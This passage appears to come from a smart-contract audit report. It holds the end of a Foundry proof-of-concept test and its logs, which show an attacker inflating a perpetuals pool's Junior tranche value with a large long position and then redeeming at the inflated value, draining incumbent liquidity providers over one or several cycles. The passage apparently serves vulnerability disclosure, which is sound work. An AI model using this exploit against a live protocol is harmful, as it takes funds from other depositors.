            juniorVault.claimRedeem(rid, claimable, ATTACKER, ATTACKER);
            r.attackerUsdgOut += settlementToken.balanceOf(ATTACKER) - before;
            vm.warp(vm.getBlockTimestamp() + 1 hours);
            _refreshMark(PRICE);
        }
        r.collateralChange = int256(clearinghouse.balanceAssets(ATTACKER)) - collateralStart;

        // One more ordinary settlement books everything into tranche principal; then read the incumbent position.
        vm.prank(INCUMBENT);
        uint256 r2 = juniorVault.requestRedeem(2e9, INCUMBENT, INCUMBENT); // a small ordinary exit (~2 USDG)
        _warpTo(juniorVault.depositEpochStart(r2));
        _refreshMark(PRICE);
        _settle();
        r.incumbentJuniorValue = juniorVault.convertToAssets(juniorVault.balanceOf(INCUMBENT))
            + juniorVault.convertToAssets(juniorVault.claimableRedeemRequest(r2, INCUMBENT));
    }

    /// @dev Attacker's absolute USDG result: redeemed minus deposited, plus the change in its trading collateral.
    function _absolute(
        Run memory r
    ) internal pure returns (int256) {
        return int256(r.attackerUsdgOut) - int256(r.attackerUsdgIn) + r.collateralChange;
    }

    function _report(
        string memory title,
        Case memory c
    ) internal {
        emit log(title);
        emit log_named_decimal_uint("  pool depth (USDG)", c.depth, 6);
        emit log_named_decimal_uint("  attacker LONG notional (USDG)", c.attackerLongNotional, 6);
        emit log_named_decimal_uint("  positive VPI paid into the pool at open (USDG)", c.attack.vpiCharge, 6);
        emit log_named_decimal_uint("  pool cash paid back to the attacker at close (USDG)", c.attack.rebate, 6);
        emit log_named_decimal_uint("  attacker USDG deposited into Junior", c.attack.attackerUsdgIn, 6);
        emit log_named_decimal_uint("  attacker USDG redeemed, attack", c.attack.attackerUsdgOut, 6);
        emit log_named_decimal_uint("  attacker USDG redeemed, control", c.control.attackerUsdgOut, 6);
        emit log_named_decimal_int("  attacker collateral change (fees, carry, VPI), attack", c.attack.collateralChange, 6);
        emit log_named_decimal_int("  END TO END: attacker absolute USDG result, attack", _absolute(c.attack), 6);
        emit log_named_decimal_int("  END TO END: attacker absolute USDG result, control", _absolute(c.control), 6);
        emit log_named_decimal_int(
            "  attacker gain vs control (USDG)", _absolute(c.attack) - _absolute(c.control), 6
        );
        emit log_named_decimal_uint("  incumbent Junior value before (USDG)", c.incumbentBefore, 6);
        emit log_named_decimal_uint("  incumbent Junior value after, control (USDG)", c.control.incumbentJuniorValue, 6);
        emit log_named_decimal_uint("  incumbent Junior value after, attack (USDG)", c.attack.incumbentJuniorValue, 6);
        emit log_named_decimal_int(
            "  INCUMBENT JUNIOR LOSS vs control (USDG)",
            int256(c.attack.incumbentJuniorValue) - int256(c.control.incumbentJuniorValue),
            6
        );
    }

    function _lots(
        uint256 notionalAssets
    ) internal pure returns (uint256) {
        return ((notionalAssets * 1e12) / 1e20) * 1e20; // whole 100-token lots at price 1.00
    }

    // ------------------------------------------------------------------ public-path helpers

    function _requestDeposit(
        TrancheVault vault,
        address lp,
        uint256 amount
    ) internal returns (uint256 requestId) {
        settlementToken.mint(lp, amount);
        vm.startPrank(lp);
        settlementToken.approve(address(vault), amount);
        requestId = vault.requestDeposit(amount, lp, lp);
        vm.stopPrank();
    }

    function _claimDeposit(
        TrancheVault vault,
        address lp,
        uint256 requestId
    ) internal {
        uint256 claimable = vault.claimableDepositRequest(requestId, lp);
        assertGt(claimable, 0, "deposit not activated");
        vm.prank(lp);
        vault.claimDeposit(requestId, claimable, lp, lp);
    }

    function _warpTo(
        uint256 t
    ) internal {
        if (vm.getBlockTimestamp() < t) vm.warp(t);
    }

    /// @dev Any keeper settles the matured LP epoch: through the Router with a signed tick while positions are open,
    ///      or directly when the book is flat.
    function _settle() internal {
        (uint256 organicSize,,,,,,) = engine.positions(ORGANIC_LONG);
        (uint256 attackerSize,,,,,,) = engine.positions(ATTACKER);
        if (organicSize == 0 && attackerSize == 0) {
            vm.prank(KEEPER);
            pool.settleLpEpoch(0, 0);
            return;
        }
        _nextBlock();
        bytes[] memory tick = _ticks(PRICE, vm.getBlockTimestamp(), engine.lastMarkTime());
        vm.prank(KEEPER);
        router.settleLpEpoch(tick);
    }

    function _openOrder(
        address account,
        CfdTypes.Side side,
        uint256 size,
        uint256 margin
    ) internal {
        OrderV3Types.OrderRequest memory request;
        request.clientOrderId = keccak256(abi.encode("open", account, ++orderNonce));
        request.side = side;
        request.sizeDelta = size;
        request.marginDelta = margin;
        request.targetPrice = side == CfdTypes.Side.LONG ? 1 : engine.CAP_PRICE();
        request.bounds = _bounds();
        vm.prank(account);
        uint64 orderId = router.commitOrder(request);
        OrderV3Types.ExecutionResult memory result = _executeAt(KEEPER, orderId, PRICE);
        assertEq(uint8(result.status), uint8(OrderV3Types.LifecycleStatus.Executed), "open failed");
    }

    function _closeOrder(
        address account,
        CfdTypes.Side side
    ) internal {
        OrderV3Types.OrderRequest memory request;
        request.clientOrderId = keccak256(abi.encode("close", account, ++orderNonce));
        request.side = side;
        (request.sizeDelta,,,,,,) = engine.positions(account);
        request.targetPrice = side == CfdTypes.Side.LONG ? engine.CAP_PRICE() : 1;
        request.isClose = true;
        request.bounds = _bounds();
        vm.prank(account);
        uint64 orderId = router.commitOrder(request);
        OrderV3Types.ExecutionResult memory result = _executeAt(account, orderId, PRICE);
        assertEq(uint8(result.status), uint8(OrderV3Types.LifecycleStatus.Executed), "close failed");
    }

    /// @dev Live v2.0.0 Router configuration, applied through the owner's 72 h timelocked config path.
    function _applyReleaseRouterConfig() internal {
        IOrderRouterAdminHost.RouterConfig memory config = _routerConfig();
        config.maxExecutionWindowSeconds = 60;
        config.orderExecutionStalenessLimit = 60;
        config.liquidationStalenessLimit = 15;
        config.basketMaxConfidenceRatioBps = 10;
        config.orderSettlementWindow = 15;
        config.maxComponentPublishTimeDivergence = 5;
        config.adverseConfidenceMultiplierBps = 2500;
        config.minOpenNotionalAssets = 1000e6;
        config.openOrderExecutionBountyBps = 1;
        config.minOpenOrderExecutionBountyAssets = 10_000;
        config.maxOpenOrderExecutionBountyAssets = 200_000;
        config.positionProtectionTriggerBountyAssets = 200_000;
        config.maxPendingOrders = 5;
        config.minEngineGas = 600_000;
        config.maxPruneOrdersPerCall = 64;
        _setRouterConfig(config);
    }

    function _bounds() internal view returns (OrderV3Types.ExecutionBounds memory bounds) {
        bounds = OrderV3Types.ExecutionBounds({
            submitBy: uint64(vm.getBlockTimestamp() + 60),
            executionWindowSeconds: 60,
            allowedExecutionModes: 1 | 2 | 4,
            expectedConfigHash: router.lifecycleBook().currentExecutionConfigHash(),
            maxExecutionBountyAssets: type(uint256).max,
            maxExecutionNotionalAssets: type(uint256).max,
            maxGrossAccountDebitAssets: type(uint256).max,
            maxActionChargeAssets: type(uint256).max,
            maxExplicitFeesAssets: type(uint256).max,
            maxPostPositionSize: type(uint256).max,
            minPostSettlementBalanceAssets: 0,
            minPostPositionEquityAssets: 0,
            maxPostLeverageBps: type(uint32).max
        });
    }

    function _executeAt(
        address keeper,
        uint64 orderId,
        uint256 price
    ) internal returns (OrderV3Types.ExecutionResult memory result) {
        uint64 commitTime = router.lifecycleBook().orderTiming(orderId).commitTimestamp;
        uint256 publishTime = uint256(commitTime) + 1;
        if (vm.getBlockTimestamp() < publishTime) {
            vm.warp(publishTime);
        }
        _nextBlock();
        bytes[] memory tick = _ticks(price, publishTime, commitTime);
        vm.prank(keeper);
        result = router.executeOrder(orderId, tick);
    }

    function _ticks(
        uint256 price,
        uint256 publishTime,
        uint256 previousPublishTime
    ) internal pure returns (bytes[] memory updateData) {
        bytes32[] memory ids = _basePythFeedIds();
        MockPyth.FeedUpdate[] memory ticks = new MockPyth.FeedUpdate[](ids.length);
        for (uint256 i; i < ids.length; ++i) {
            ticks[i] = MockPyth.FeedUpdate(
                ids[i], MockPyth.MockPrice(int64(uint64(price)), 0, -8, publishTime, previousPublishTime)
            );
        }
        updateData = new bytes[](1);
        updateData[0] = abi.encode(ticks);
    }

    function _refreshMark(
        uint256 price
    ) internal {
        if (vm.getBlockTimestamp() <= engine.lastMarkTime()) {
            vm.warp(uint256(engine.lastMarkTime()) + 1);
        }
        _nextBlock();
        router.updateMarkPrice(_ticks(price, vm.getBlockTimestamp(), engine.lastMarkTime()));
    }

    function _nextBlock() internal {
        vm.roll(vm.getBlockNumber() + 1);
        vm.warp(vm.getBlockTimestamp() + 1);
    }

}
```

</details>

### Output:

```text
Ran 3 tests for test/perps/poc/PositiveVpiRedeemSpike.t.sol:PositiveVpiRedeemSpikePoC
[PASS] test_OneCycle_RedeemAtSelfInflatedNav() (gas: 12121259)
Logs:
  ONE CYCLE (attacker 50% of Junior, organic skew 25%)
    pool depth (USDG): 30014064.498593
    attacker LONG notional (USDG): 4295500.000000
    positive VPI paid into the pool at open (USDG): 13807.496858
    pool cash paid back to the attacker at close (USDG): 12089.058482
    attacker USDG deposited into Junior: 10000000.000000
    attacker USDG redeemed, attack: 10006807.667498
    attacker USDG redeemed, control: 9999908.738711
    attacker collateral change (fees, carry, VPI), attack: -3436.838376
    END TO END: attacker absolute USDG result, attack: 3370.829122
    END TO END: attacker absolute USDG result, control: -91.261289
    attacker gain vs control (USDG): 3462.090411
    incumbent Junior value before (USDG): 10013925.427830
    incumbent Junior value after, control (USDG): 10013697.105416
    incumbent Junior value after, attack (USDG): 10008516.615522
    INCUMBENT JUNIOR LOSS vs control (USDG): -5180.489894

[PASS] test_Sensitivity() (gas: 69952332)
Logs:
  SENSITIVITY: zero organic skew, attacker 50% of Junior
    pool depth (USDG): 30000002.000000
    attacker LONG notional (USDG): 11790000.000000
    positive VPI paid into the pool at open (USDG): 23167.348455
    pool cash paid back to the attacker at close (USDG): 18450.695501
    attacker USDG deposited into Junior: 10000000.000000
    attacker USDG redeemed, attack: 10011492.388402
    attacker USDG redeemed, control: 9999908.674543
    attacker collateral change (fees, carry, VPI), attack: -9432.852954
    END TO END: attacker absolute USDG result, attack: 2059.535448
    END TO END: attacker absolute USDG result, control: -91.325457
    attacker gain vs control (USDG): 2150.860905
    incumbent Junior value before (USDG): 9999862.988111
    incumbent Junior value after, control (USDG): 9999634.697762
    incumbent Junior value after, attack (USDG): 9992767.637543
    INCUMBENT JUNIOR LOSS vs control (USDG): -6867.060219
  SENSITIVITY: attacker share of Junior (bps), organic skew 25%: 2000
    attacker net vs control (USDG): -507.590313
    incumbent Junior, attack minus control (USDG): -780.849609
  SENSITIVITY: attacker share of Junior (bps), organic skew 25%: 2500
    attacker net vs control (USDG): 10.053802
    incumbent Junior, attack minus control (USDG): -1346.253667
  SENSITIVITY: attacker share of Junior (bps), organic skew 25%: 3000
    attacker net vs control (USDG): 568.850233
    incumbent Junior, attack minus control (USDG): -1959.650038
  SENSITIVITY: attacker share of Junior (bps), organic skew 25%: 4000
    attacker net vs control (USDG): 1850.914070
    incumbent Junior, attack minus control (USDG): -3378.193732
  SENSITIVITY: attacker share of Junior (bps), organic skew 25%: 5000
    attacker net vs control (USDG): 3462.090411
    incumbent Junior, attack minus control (USDG): -5180.489894

[PASS] test_ThreeCycles() (gas: 25993604)
Logs:
  THREE CYCLES (attacker 50% of Junior, organic skew 25%)
    pool depth (USDG): 30014064.498593
    attacker LONG notional (USDG): 4295500.000000
    positive VPI paid into the pool at open (USDG): 13807.496858
    pool cash paid back to the attacker at close (USDG): 12089.058482
    attacker USDG deposited into Junior: 30000000.000000
    attacker USDG redeemed, attack: 30020432.074720
    attacker USDG redeemed, control: 29999726.202383
    attacker collateral change (fees, carry, VPI), attack: -10310.515255
    END TO END: attacker absolute USDG result, attack: 10121.559465
    END TO END: attacker absolute USDG result, control: -273.797617
    attacker gain vs control (USDG): 10395.357082
    incumbent Junior value before (USDG): 10013925.427830
    incumbent Junior value after, control (USDG): 10013148.994740
    incumbent Junior value after, attack (USDG): 9997598.439210
    INCUMBENT JUNIOR LOSS vs control (USDG): -15550.555530

Suite result: ok. 3 passed; 0 failed; 0 skipped; finished in 228.75ms (296.84ms CPU time)

Ran 1 test suite in 244.46ms (228.75ms CPU time): 3 tests passed, 0 failed, 0 skipped (3 total tests)
```
